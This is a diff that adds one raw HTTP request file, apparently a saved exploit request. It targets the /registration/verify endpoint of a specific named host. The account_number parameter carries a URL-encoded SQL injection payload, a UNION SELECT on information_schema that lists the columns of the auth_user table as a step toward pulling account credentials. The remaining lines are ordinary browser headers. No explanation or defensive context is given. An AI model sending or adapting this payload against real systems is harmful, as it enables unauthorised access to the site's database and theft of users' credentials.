@@ -1,0 +1,17 @@
+GET /registration/verify?is_search=1&account_number=-10143105%27union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2Cgroup_concat%28column_name%29%2C20%20from%20information_schema.columns%20where%20table_name%3D%27auth_user%27--%20- HTTP/1.1
+Host: agma.zaneco.ph
+Sec-Ch-Ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+Sec-Ch-Ua-Platform: "Windows"
+Sec-Gpc: 1
+Accept-Language: en-US,en;q=0.5
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://agma.zaneco.ph/
+Accept-Encoding: gzip, deflate, br
+Connection: close
+
